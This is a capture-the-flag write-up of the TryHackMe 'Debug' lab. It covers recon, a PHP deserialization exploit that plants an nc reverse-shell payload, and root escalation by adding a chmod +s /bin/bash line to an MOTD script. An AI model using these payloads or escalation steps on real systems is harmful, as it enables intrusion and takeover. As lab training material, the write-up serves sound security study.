---
title: Debug
layout: post
author: Bit Criminals Team
date: 2021-06-11 12:07:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/debug
---

First, connect to TryHackMe using OpenVPN (or use the AttackBox if you prefer that)start the machine from tryhackme, wait for one minute so that the IP Address shows. Now, we are reading to do our hacking!

## TASK 1

The task is to deploy the box, which we have already done. So click on **Completed** and move on.

## TASK 2

First, let's do a basic nmap scan:
```shell
nmap -Pn -A $MACHINE_IP
```

![](/images/v1per/Debug_1.png)

So, we get 2 open ports: **Port 22 (SSH)** and **Port 80 (HTTP)**

We can see that there's a web-server open, so let's visit the website.
**http://$MACHINE_IP:80**

![](/images/v1per/Debug_2.png)

It's an Apache2 Ubuntu Default page. Nothing much in here. Let's run gobuster in directory busting mode to find some hidden directories.

```shell
gobuster dir -u $MACHINE_IP -w /usr/share/wordlists/dirb/common.txt -z -x html,txt,php
```

![](/images/v1per/Debug_3.png)

We find a **/backup** directory. Let's visit it: **http://$MACHINE_IP:80/backup**

![](/images/v1per/Debug_4.png)

The file which stands out here is the **index.php.bak** (backup files always contain something fishy). Let's download it and see it's contents.
This part stood out:

![](/images/v1per/Debug_5.png)

So, our best guess at this moment is a PHP Deserialization attack. 
Note that we also found a **/index.php** from gobuster. Visiting it, we see a Form Submit area. 

![](/images/v1per/Debug_6.png)

Filling it with arbitrary values and submitting it, we see that it gets displayed in **http://$MACHINE_IP:80/message.txt**, which is what the PHP file we found is doing. I wrote this PHP code for the attack (replace $your_tun0_IP with, well, what it says):

```php
<?php
class FormSubmit{
        public $form_file = 'lol.php';
        public $message = '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $your_tun0_IP 1234 >/tmp/f"); ?>';
}
$obj = new FormSubmit();
echo urlencode(serialize($obj));
?>
```

Now, run the PHP file using:
```shell
php <your_php_file.php>
```

![](/images/v1per/Debug_7.png)

Copy this output, and run the following command to upload our payload:
```shell
curl -i http://$MACHINE_IP:80/index.php?debug=<copied_text>
```
or just visit the following website:
**http://$MACHINE_IP:80/index.php?debug=<copied_text>**

![](/images/v1per/Debug_8.png)

Now, let's set up a netcat listener on our terminal:
```shell
nc -lnvp 1234
```
and navigate to **http://$MACHINE_IP:80/lol.php**.
And YAY! We have got our shell!

![](/images/v1per/Debug_9.png)

On displaying the contents of .htpasswd we find the hash of user james.

```                          
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1 
```
Now we can ssh into the box as user james and get the user flag.

We find a note left to james in /home/james directory.

```s
james@osboxes:~$ cat Note-To-James.txt                         
Dear James,                                                                
                                                                                                                                                      
As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 
                                                                           
But there's still one thing I'd like you to do, before the submission.
                                     
Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D                                                 

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```
On looking at the bash history we find this file /etc/update-motd.d/00-header so we try to see what it does.
We edit the file and add the following line to the top of the file contents:
```
chmod +s /bin/bash
```
Now we have to keep in mind that the files are executed when the user logs in via SSH, as is evident from the note left to james.
So we open another terminal and SSH as user james.
After this we can just execute the command:
```
/bin/bash -p
```
and we have escalated out privileges to root. Now we can go to the root directory and print the contents of root.txt.

